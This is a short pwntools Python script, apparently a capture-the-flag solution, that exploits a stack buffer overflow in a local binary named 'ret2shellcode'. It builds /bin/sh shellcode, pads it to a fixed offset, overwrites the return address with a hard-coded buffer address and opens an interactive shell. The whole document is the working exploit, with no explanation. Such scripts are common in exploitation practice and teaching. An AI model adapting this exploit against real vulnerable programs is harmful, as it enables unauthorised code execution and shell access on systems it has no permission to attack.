from pwn import *

p = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
offset = 0x6c + 4

p.sendline(shellcode.ljust(offset, b'A') + p32(buf2_addr))
p.interactive() 